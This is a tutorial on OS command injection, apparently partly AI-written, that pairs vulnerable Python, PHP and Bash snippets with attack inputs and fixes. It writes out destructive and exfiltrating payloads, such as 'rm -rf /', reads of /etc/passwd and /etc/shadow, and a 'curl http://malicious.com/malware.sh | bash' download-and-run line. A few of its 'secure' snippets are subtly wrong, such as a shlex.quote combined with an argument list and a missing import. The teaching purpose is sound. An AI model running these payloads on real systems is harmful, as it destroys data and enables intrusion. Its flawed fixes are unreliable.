# OS-command-injection
### **What is OS Command Injection?**

**OS Command Injection**, also known as **Command Injection**, is a security vulnerability that allows an attacker to execute arbitrary operating system commands on the server running an application. This occurs when user-supplied input is passed directly to a shell or command-line interface without proper validation or sanitization.

---

### **How OS Command Injection Happens**

OS command injection occurs in scenarios where:

1. The application dynamically constructs shell commands using user inputs.
2. These inputs are not properly sanitized or escaped.
3. The attacker includes malicious commands as part of their input.

---

### **Key Indicators**

* **Dynamic Command Execution**: Use of functions like `system()`, `exec()`, `popen()`, `passthru()` in PHP, `subprocess.run()` in Python, etc.
* **Shell Execution**: Constructing shell commands with user-provided values.

---

### **Practical Examples**

#### **Example 1: File Operations**

An application allows users to list files in a directory by passing the directory name as input.

**Vulnerable Code:**

```python
import os

def list_files(directory):
    # Vulnerable: User input is directly concatenated into the command
    command = f"ls {directory}"
    os.system(command)
```

#### **Attack**:

Input: `; rm -rf /`

Resulting command:

```bash
ls ; rm -rf /
```

This executes `ls` to list files and then deletes everything in the root directory (`rm -rf /`).

---

#### **Example 2: Ping Utility**

An application provides a ping tool where users can enter an IP address to check network connectivity.

**Vulnerable Code:**

```php
<?php
$ip = $_GET['ip'];
// Vulnerable: Directly embedding user input in the command
$output = shell_exec("ping -c 4 " . $ip);
echo $output;
?>
```

#### **Attack**:

Input: `8.8.8.8; cat /etc/passwd`

Resulting command:

```bash
ping -c 4 8.8.8.8; cat /etc/passwd
```

This pings the IP and then displays the content of `/etc/passwd`.

---

#### **Example 3: Backup Utility**

An application allows users to specify a file to back up.

**Vulnerable Code:**

```bash
#!/bin/bash
file=$1
# Vulnerable: User input is not sanitized
tar -czvf backup.tar.gz $file
```

#### **Attack**:

Input: `; rm -rf /`

Resulting command:

```bash
tar -czvf backup.tar.gz ; rm -rf /
```

This creates a backup and then deletes everything on the server.

---

### **Types of Command Injection**

1. **Blind Command Injection**:

   * The attacker cannot see the output of the command but can observe side effects (e.g., delays, error messages).
   * Example: Using `ping -c 10 127.0.0.1` to observe delays in the application’s response.

2. **Non-Blind Command Injection**:

   * The attacker can see the output of the command directly in the application response.
   * Example: Displaying the output of `ls` or `cat` commands in the application.

---

### **Testing for OS Command Injection**

1. **Payload Examples**:

   * `; ls`
   * `&& cat /etc/passwd`
   * `| whoami`
   * `$(id)`

2. **Indicators**:

   * Unexpected output, such as a list of files or user information.
   * Delayed responses when using commands like `sleep 10`.

3. **Tools**:

   * **Burp Suite**: For intercepting and modifying requests.
   * **OWASP ZAP**: For automated vulnerability scanning.
   * **Custom Scripts**: Using Python or Bash to test inputs systematically.

---

### **Mitigation Strategies**

1. **Input Validation**:

   * Allow only expected inputs (e.g., IP addresses, filenames) using regex or input sanitization.

   ```python
   import re
   if not re.match(r'^[a-zA-Z0-9._-]+$', input_value):
       raise ValueError("Invalid input")
   ```

2. **Avoid Direct Command Execution**:

   * Use language-specific libraries instead of calling shell commands.
   * Example: Use Python’s `os` or `shutil` modules for file operations instead of `os.system`.

3. **Escape User Inputs**:

   * Use functions that safely escape inputs (e.g., `shlex.quote()` in Python).

   ```python
   import shlex
   command = f"ls {shlex.quote(directory)}"
   ```

4. **Use Secure APIs**:

   * Prefer APIs that do not rely on shell execution.
   * Example: Use `subprocess.run()` with arguments as a list:

     ```python
     import subprocess
     subprocess.run(["ls", directory])
     ```

5. **Restrict Permissions**:

   * Run applications with the least privileges necessary.
   * Limit access to sensitive files and directories.

6. **Environment Isolation**:

   * Use containerization (e.g., Docker) to sandbox applications and prevent system-wide impacts.

7. **Monitoring and Logging**:

   * Track unusual command executions or system calls.
   * Use tools like **Auditd** or **OSSEC** for intrusion detection.

---

### **Example with Mitigation**

**Secure Implementation:**

```python
import subprocess
import shlex

def list_files(directory):
    # Sanitize user input
    directory = shlex.quote(directory)
    
    # Use subprocess with argument list
    try:
        result = subprocess.run(["ls", directory], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error: {e}")
```

---

Here are **additional examples of OS command injection**, exploring different scenarios and attack vectors. These examples highlight vulnerabilities in various contexts, showing how attackers exploit them and how to mitigate the issues.

---

### **Example 4: Web-Based File Viewer**

#### Scenario:

A web application allows users to view a specific log file by specifying its name through a query parameter.

**Vulnerable Code:**

```python
import os

def view_log(filename):
    # Vulnerable: User input is directly concatenated into the command
    os.system(f"cat /var/logs/{filename}")
```

#### Attack:

Input: `../../etc/passwd`

Resulting command:

```bash
cat /var/logs/../../etc/passwd
```

This allows an attacker to traverse directories and read sensitive files.

---

#### **Mitigation**:

* Use a whitelist to restrict filenames to known log files.
* Avoid directly concatenating inputs into shell commands.

Secure Code:

```python
import os

def view_log(filename):
    allowed_files = {"access.log", "error.log"}
    if filename not in allowed_files:
        raise ValueError("Invalid log file")
    with open(f"/var/logs/{filename}", "r") as log_file:
        print(log_file.read())
```

---

### **Example 5: Image Processing Tool**

#### Scenario:

An application allows users to upload an image and applies a watermark using a shell command.

**Vulnerable Code:**

```php
<?php
$image = $_FILES['image']['name'];
$command = "convert $image -gravity southeast watermark.png output.png";
exec($command);
?>
```

#### Attack:

Input filename: `image.jpg; rm -rf /`

Resulting command:

```bash
convert image.jpg -gravity southeast watermark.png output.png; rm -rf /
```

This processes the image and then deletes critical files.

---

#### **Mitigation**:

* Validate filenames to prevent injection.
* Use secure APIs for image processing.

Secure Code:

```php
<?php
$image = escapeshellarg($_FILES['image']['name']);
$command = "convert $image -gravity southeast watermark.png output.png";
exec($command);
?>
```

---

### **Example 6: User-Provided Shell Commands**

#### Scenario:

A server script executes user-provided shell commands for administrative purposes.

**Vulnerable Code:**

```bash
#!/bin/bash
read -p "Enter the command to run: " user_command
eval $user_command
```

#### Attack:

Input: `; curl http://malicious.com/malware.sh | bash`

Resulting command:

```bash
curl http://malicious.com/malware.sh | bash
```

This downloads and executes a malicious script.

---

#### **Mitigation**:

* Avoid using `eval` with untrusted inputs.
* Whitelist specific commands and reject others.

Secure Code:

```bash
#!/bin/bash
read -p "Enter the command to run (allowed: date, uptime): " user_command

case $user_command in
    "date") date ;;
    "uptime") uptime ;;
    *) echo "Invalid command" ;;
esac
```

---

### **Example 7: Remote Command Execution via API**

#### Scenario:

An API provides server diagnostics by executing user-provided commands.

**Vulnerable Code:**

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/diagnostics", methods=["GET"])
def diagnostics():
    command = request.args.get("cmd")
    os.system(command)
    return "Command executed"
```

#### Attack:

URL: `http://example.com/diagnostics?cmd=ls;cat /etc/shadow`

Resulting command:

```bash
ls;cat /etc/shadow
```

This leaks sensitive data like hashed passwords.

---

#### **Mitigation**:

* Restrict the commands that can be executed.
* Use a predefined list of allowed commands.

Secure Code:

```python
@app.route("/diagnostics", methods=["GET"])
def diagnostics():
    allowed_commands = {"ls", "df", "uptime"}
    command = request.args.get("cmd")
    if command not in allowed_commands:
        return "Invalid command", 400
    result = subprocess.run([command], capture_output=True, text=True)
    return result.stdout
```

---

### **Example 8: Backup Script Vulnerability**

#### Scenario:

A backup script accepts the target directory from user input.

**Vulnerable Code:**

```bash
#!/bin/bash
read -p "Enter directory to backup: " dir
tar -czvf backup.tar.gz $dir
```

#### Attack:

Input: `; echo hacked > /tmp/hack.txt`

Resulting command:

```bash
tar -czvf backup.tar.gz ; echo hacked > /tmp/hack.txt
```

This creates a file indicating a successful injection.

---

#### **Mitigation**:

* Validate the directory path to ensure it exists and contains no special characters.

Secure Code:

```bash
#!/bin/bash
read -p "Enter directory to backup: " dir
if [[ "$dir" =~ ^/ ]]; then
    tar -czvf backup.tar.gz "$dir"
else
    echo "Invalid directory"
fi
```

---

### **Example 9: Network Diagnostic Tool**

#### Scenario:

A web application lets users check the connectivity to a specified hostname or IP.

**Vulnerable Code:**

```php
<?php
$host = $_GET['host'];
$output = shell_exec("ping -c 4 " . $host);
echo $output;
?>
```

#### Attack:

Input: `127.0.0.1; curl http://malicious.com/malware.sh | bash`

Resulting command:

```bash
ping -c 4 127.0.0.1; curl http://malicious.com/malware.sh | bash
```

This executes arbitrary commands after the ping.

---

#### **Mitigation**:

* Validate the input to ensure it is a valid hostname or IP address.

Secure Code:

```php
<?php
$host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 4 " . $host);
echo $output;
?>
```

---

### **Example 10: Log Rotation Script**

#### Scenario:

A script rotates logs based on a user-specified filename.

**Vulnerable Code:**

```bash
#!/bin/bash
log_file=$1
mv /var/logs/$log_file /var/logs/$log_file.bak
```

#### Attack:

Input: `log.txt; rm -rf /`

Resulting command:

```bash
mv /var/logs/log.txt /var/logs/log.txt.bak; rm -rf /
```

This deletes critical files on the server.

---

#### **Mitigation**:

* Validate that `log_file` matches expected filenames.

Secure Code:

```bash
#!/bin/bash
log_file=$1
if [[ "$log_file" =~ ^[a-zA-Z0-9._-]+$ ]]; then
    mv /var/logs/$log_file /var/logs/$log_file.bak
else
    echo "Invalid filename"
fi
```

---

These examples demonstrate how attackers exploit poorly sanitized inputs to execute arbitrary commands. By validating input, escaping dangerous characters, and avoiding direct shell execution, you can effectively mitigate OS command injection risks. If you'd like to see even more examples or discuss specific scenarios, let me know!

